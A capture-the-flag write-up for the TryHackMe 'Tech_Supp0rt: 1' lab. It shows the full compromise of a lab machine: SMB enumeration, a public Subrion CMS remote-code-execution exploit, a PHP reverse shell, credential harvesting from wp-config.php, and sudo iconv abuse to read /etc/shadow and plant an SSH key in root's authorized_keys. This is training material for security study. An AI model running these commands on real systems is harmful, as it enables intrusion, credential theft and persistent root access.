---
description: https://tryhackme.com/room/techsupp0rt1
---

# Tech\_Supp0rt: 1

## Nmap

```
nmap 10.10.195.72 -p- -sS -sV

PORT    STATE    SERVICE     VERSION
22/tcp  open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
53/tcp  filtered domain
80/tcp  open     http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

First off we check `SMB` for null access and find the share _websrv_ which is readable by anyone.

```
smbmap -H '10.10.195.72' -u '' -p '' -R
```

![](<../../../.gitbook/assets/image (428).png>)

the file `enter.txt` is of interest, we then download it using `smbmap`.

```
smbmap -H '10.10.195.72' -u '' -p '' -R -A 'enter.txt'
```

Reading the contents of `enter.txt` we find this is a to-do list. We can make a note of the information.

![](<../../../.gitbook/assets/image (1704).png>)

The default page on port 80 comes to the default `Apache 2` web page.

![](<../../../.gitbook/assets/image (1769).png>)

Running `feroxbuster` against the target system we discover a few interesting results.

```
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200 
```

![](<../../../.gitbook/assets/image (388).png>)

Under `/test/index.html` we find a fake scam web page.

![](<../../../.gitbook/assets/image (119) (2).png>)

We also find WordPress is installed under `/wordpress/`.

![](<../../../.gitbook/assets/image (275).png>)

I enumerate the `Wordpress` site and tried to identify vulnerable plugins with `WPScan` and was unable to find any vulnerabilities.

Looking back at the information in the `enter.txt` file we are reminded of the presence of `Subrion` which is a CMS system.

Attempting to browse to `/subrion` redirects us incorrectly. The enter.txt file mentions fixing the issue by using the "panel". A quick Google search shows this normally exists under the directory name /panel.

Browsing to `http://<IP>/subrion/panel/` proves successful.

![](<../../../.gitbook/assets/image (1295).png>)

However, we are unable to login to the system. Looking at the admin credentials earlier in `enter.txt` we see the remark "Cooked with magic formula".

![](<../../../.gitbook/assets/image (199).png>)

Taking the hash value and running it through CyberChef's "Magic" options reveals the plain text password for the value.

![](<../../../.gitbook/assets/image (938).png>)

We are then able to login successfully to the Subrion panel.

![](<../../../.gitbook/assets/image (114).png>)

Researching vulnerabilities for Subrion 4.2.1 on Google we find the following CVE and exploit on Github.

**CVE:** [https://nvd.nist.gov/vuln/detail/CVE-2018-19422](https://nvd.nist.gov/vuln/detail/CVE-2018-19422)

**Description**

/panel/uploads in Subrion CMS 4.2.1 allows remote attackers to execute arbitrary PHP code via a .pht or .phar file, because the .htaccess file omits these.

**Github:** [https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE](https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE)

As per the the Github repository we run the exploit with the following syntax:

```bash
python3 exploit.py -u 'http://10.10.26.125/subrion/panel/' -l 'admin'  -p <Password>
```

Where we receive a shell.

![](<../../../.gitbook/assets/image (946).png>)

Unfortunately, for various reasons this shell is not ideal for what we need. As such I uploaded a PHP reverse shell and set up a `netcat` listener on my attacking system.

I was then able to catch a more reliable shell.

![](<../../../.gitbook/assets/image (16) (1) (2).png>)

Next, upgrade to a TTY shell.

{% content-ref url="../../../everything/everything-linux/shell-upgrades.md" %}
[shell-upgrades.md](../../../everything/everything-linux/shell-upgrades.md)
{% endcontent-ref %}

Enumerating the WordPress install we find some credentials in `wp-config.php`.

![](<../../../.gitbook/assets/image (2060).png>)

Looking at `/etc/passwd` we see the user _scamsite_ exists on the system. We are then able to switch over to the user with the found credentials.

![](<../../../.gitbook/assets/image (1184).png>)

Checking the **sudo** permissions for _scamsite_ we see the user is able to run `/usr/bin/iconv` as root without specifying a password.

![](<../../../.gitbook/assets/image (2056).png>)

Viewing GTFOBins we see this binary can be used to perform privileged read and writes to the system.

**GTFOBins:** [https://gtfobins.github.io/gtfobins/iconv/](https://gtfobins.github.io/gtfobins/iconv/)

![](<../../../.gitbook/assets/image (1037).png>)

We can go for an easy flag grab

```bash
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /etc/shadow
```

![](<../../../.gitbook/assets/image (1697).png>)

Alternatively we can grab a root `SSH` shell.

```
# Generate SSH key files on attacking system
ssh-keygen
# Keep hitting enter to generate a new /.ssh/id_rsa.pub
```

On the target system copy the contents of `/.ssh/id_rsa.pub` into the command below to create the authorized keys files in the `/root/.ssh/` directory.

```
echo 'ssh-rsa AAAAB3NzaC1yAAADAQABAAABgQDnSqBG0mN7Ceqvr44mZHi4viNBtJKvCU2rOkhgwhhYDdExldniqHY4VIfQWnVlczB8WLSZjgtGJIbDf7IXXbBwTs42asHqz/aum0Oyz7AzZEi57cdTybj+6qFYiv6Znd2IxO9t0IsEjitzG9WoFoI52neyz4XoZwGZO1lsiBJNuy8hwMfB5aHI8xAaiRpTmDa/+G+lQN5yEBoSO8EUK8J4CeD2aO2WoAw8CHqy2zjYEHny1oIa4pjHVXsstv+GcScKWBcoT2pG/hRK9KZSs/pD3eOOypztMONOzlt2lfd5Eg5zNzlq+qbzzdA00XUtdfb2EV5oK3v4mKbEHT2HCKgtvzVQaLo4WCyNU2MiQ1Ia+MZjVwkdbr9lUKka3QSM1fBF7ozucmxvjzx2jd7b7gNf4B9qOJYYfQGc2gkS1ryldrWDEniGuEqI7jUqpG3uzVycTRqC0l+XROhW9VKUoUe5VSNyqVVXmWZzQ46ajLoWl4ZklBgnbL0CPU= kali@kali' | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
```

Then login to the target system as root without needing to specify a password.

```bash
ssh root@<IP>
```

![](<../../../.gitbook/assets/image (475).png>)
